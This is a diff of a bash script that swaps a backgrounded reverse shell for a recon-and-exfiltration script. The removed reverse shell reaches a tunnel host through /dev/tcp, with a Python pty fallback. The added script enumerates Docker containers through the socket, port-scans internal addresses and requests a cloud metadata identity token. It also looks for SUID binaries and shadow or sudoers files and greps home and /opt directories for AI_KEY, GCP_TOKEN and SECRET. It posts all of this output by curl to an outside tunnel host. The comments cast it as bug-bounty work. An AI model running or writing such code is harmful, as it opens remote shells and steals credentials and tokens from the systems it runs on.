@@ -1,18 +1,29 @@
 #!/bin/bash
-HOST="2ba9c3ba89222ecc-103-95-173-85.serveousercontent.com"
+URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
-# Use a subshell and background it
-(
-  # Wait for system to stabilize
-  sleep 3
+{
+  echo "--- [1] DOCKER SOCKET PIVOTING ---"
+  # List ALL containers, including hidden ones, and their networks
+  curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 | grep -oE '"Names":\["/[^"]+"\]|"Id":"[a-f0-8]+"'
   
-  # Check if /dev/tcp is available, otherwise fall back to python
-  if [ -e /dev/tcp ]; then
-    exec 5<>/dev/tcp/$HOST/80
-    echo -e "POST / HTTP/1.1\nHost: $HOST\nConnection: Upgrade\nUpgrade: websocket\n\n" >&5
-    /bin/bash -i <&5 >&5 2>&5
-  else
-    # Python fallback if /dev/tcp is disabled
-    python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$HOST',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
-  fi
-) &>/dev/null &
+  echo "--- [2] INTERNAL NETWORK SCAN (Bounty Multiplier) ---"
+  # Scan for internal Google IPs (10.x.x.x and 172.x.x.x ranges)
+  # This proves you can attack other Google services from this VM
+  for ip in 172.17.0.{1..10} 10.0.0.{1..5}; do
+    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/80" && echo "PROBE SUCCESS: $ip:80 (Web)") &
+    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/22" && echo "PROBE SUCCESS: $ip:22 (SSH)") &
+  done; wait
+
+  echo "--- [3] THE 'METADATA' DEEP DIVE ---"
+  # This checks for "Identity Tokens" which are the gold standard for VRP
+  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://cloud.google.com/" || echo "Identity Probe Blocked"
+
+  echo "--- [4] KERNEL & EXPLOIT SEARCH ---"
+  # Checking for 'dirty pipe' or 'overlayfs' vulnerabilities (Host takeover)
+  ls -l /etc/shadow /etc/sudoers 2>/dev/null
+  find / -perm -4000 -type f 2>/dev/null | head -n 10
+
+  echo "--- [5] HIDDEN CONFIGS & HISTORY ---"
+  # Searching for hardcoded GCP credentials in common developer locations
+  grep -rE "AI_KEY|GCP_TOKEN|SECRET" /opt /home/jules 2>/dev/null | head -c 500
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
